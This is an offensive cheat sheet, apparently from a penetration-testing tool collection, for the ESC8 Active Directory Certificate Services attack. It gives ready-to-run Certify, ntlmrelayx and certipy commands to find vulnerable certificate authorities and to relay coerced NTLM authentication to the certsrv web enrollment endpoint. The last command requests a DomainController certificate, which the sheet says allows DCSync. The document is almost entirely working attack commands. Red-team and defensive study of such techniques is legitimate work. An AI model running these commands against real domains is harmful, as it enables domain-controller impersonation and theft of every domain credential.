---
technique: ESC8 - NTLM Relay to Web Enrollment
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc8 certificate-services pkinit
---

# ESC8 - NTLM Relay to Web Enrollment

ESC8 relays coerced NTLM authentication to AD CS web enrollment endpoints to obtain certificates for the coerced principal.

## Windows

### Certify: enumerate web endpoints (ESC8)

#powershell #certify #enum

Enumerate enabled web enrollment endpoints (HTTP and HTTPS) on all CAs; if any are present, conduct the relay from a Linux host.

```powershell title:"ESC8: enumerate enabled CA web enrollment endpoints"
.\Certify.exe cas
```
<!-- cheat
import domain_ip
import users
-->

## Linux

### ntlmrelayx: ESC8 web endpoint relay

#python #ntlmrelayx #ntlm-relay #http

Start ntlmrelayx targeting the certsrv web enrollment endpoint; pair with a coercion technique to force the target account to authenticate.

```sh title:"ESC8: relay coerced NTLM to certsrv web enrollment"
ntlmrelayx.py -t http://$ca_fqdn/certsrv/certfnsh.asp --adcs --template "$template_name"
```
<!-- cheat
import domain_ip
var ca_fqdn
var template_name
-->

### certipy: enumerate ESC8 and ESC11 CAs

#certipy #enum

Find CAs vulnerable to ESC8 or ESC11 and list enabled auth templates suitable for use with the relay.

```sh title:"ESC8/ESC11: find vulnerable CAs and usable templates"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->

### certipy relay: ESC8 DC template

#certipy #relay #ntlm-relay #http #dc

Relay coerced NTLM from a domain controller to certsrv using certipy relay; DomainController template issues a cert that can PKINIT as the DC for DCSync.

```sh title:"ESC8: certipy relay for DC cert (DomainController template)"
certipy relay -target "http://$ca_fqdn" -template DomainController
```
<!-- cheat
import domain_ip
var ca_fqdn
-->
